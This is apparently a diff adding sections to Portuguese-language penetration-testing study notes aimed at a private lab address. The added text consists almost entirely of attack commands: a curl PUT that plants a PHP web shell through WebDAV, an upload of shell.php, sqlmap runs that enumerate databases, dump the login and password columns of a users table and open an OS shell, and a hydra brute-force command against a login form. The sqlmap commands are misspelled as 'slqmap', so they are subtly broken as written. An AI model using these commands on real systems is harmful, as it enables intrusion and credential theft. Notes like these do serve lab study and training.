@@ -75,4 +75,53 @@ Verificando metodos aceitos:
     
     nc -v 172.16.1.10 -C
         PUT /webdev/teste.php HTTP/1.0
-        Host:172.16.1.10   
+        Host:172.16.1.10
+
+================================================================================
+                        Método PUT e Webdav
+================================================================================
+
+webdav  -> É um conjunto de extensões para o protocolo HTTP que permite que os
+           usuários gerenciem arquivos em servidores remotos.
+
+Enviando comandos para o servidor:
+
+    curl -v -X PUT -d "<?php 'system('\$_GET["cmd"]');?>" http://172.16.1.10/webdav/teste.php
+
+Enviando arquivos:
+
+    curl -v http://172.16.1.10/webdav/ --upload-file shell.php
+
+================================================================================
+                            SQL Map
+================================================================================
+
+# Mostrar base de dados atual
+slqmap -u "172.16.1.10/turismo/agencias.php?loja=sp" --current-db
+
+# Mostrar todas as bases de dados
+slqmap -u "172.16.1.10/turismo/agencias.php?loja=sp" --dbs
+
+# Mostrar todas as tabelas do banco dbmrtur
+slqmap -u "172.16.1.10/turismo/agencias.php?loja=sp" -D dbmrtur --tables
+
+# Mostrar as colunas existentes da tabela mrusers
+slqmap -u "172.16.1.10/turismo/agencias.php?loja=sp" -D dbmrtur -T mrusers --columns
+
+# Mostrar os valores das colunas login e senha
+slqmap -u "172.16.1.10/turismo/agencias.php?loja=sp" -D dbmrtur -T mrusers -C 'login,senha' --dump
+
+# Mostrar usuario atual
+slqmap -u "172.16.1.10/turismo/agencias.php?loja=sp" --current-user
+
+# Mostrar todos os usuarios
+slqmap -u "172.16.1.10/turismo/agencias.php?loja=sp" -users
+
+# Obter uma shell
+slqmap -u "172.16.1.10/turismo/agencias.php?loja=sp" --os-shell
+
+================================================================================
+                                Hydra
+================================================================================
+
+hydra -v -L users.txt -P pass.txt 172.16.1.10 http-post-form "/turismo/login.php:login=^USER^&senha=^PASS^&Login:incorreto"
